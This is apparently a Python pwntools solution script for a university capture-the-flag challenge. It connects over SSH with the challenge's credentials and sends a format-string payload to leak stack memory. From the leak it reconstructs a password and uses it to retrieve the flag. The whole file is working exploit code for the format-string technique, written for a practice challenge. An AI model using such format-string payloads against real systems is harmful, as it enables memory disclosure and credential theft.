#!/usr/bin/env python3
import re
from pwn import *

# Connect via SSH and initiate interactive "shell"
p = ssh("isaac", "poison-in-the-wells-3.ctf.umanitobacssa.ca", password="ctf2025!", port=30203, timeout=5, raw=True)
io = p.shell()

format_string = b"%16$.08lx%15$.08lx%14$.08lx\n"
io.send(format_string)

text = io.recvuntil(b"for a list of commands")

match = re.search(rb"Unknown command: '([0-9a-f]+)", text)

if match:
    hex_leak = match.group(1).decode()  # Extract and decode hex string

    # Convert hex string to bytes and decode as utf-8. Reverse character order to print the password.
    password = bytes.fromhex(''.join(hex_leak)).decode('utf-8')[::-1]

    print(f"Leaked password: {password}")
    
    io.sendline(b"contacts 58148512-34.txt")
    io.sendline(password.encode())
    match = io.recvline_regex(rb"cssactf{.*}", exact=True)

    if match:
        print(f"Flag: {match.decode()}")
        io.close()
    else:
        io.close()
        print("Flag not found.")
        exit(1)
else:
    io.close()
    print("Password leak failed.")
    exit(1)
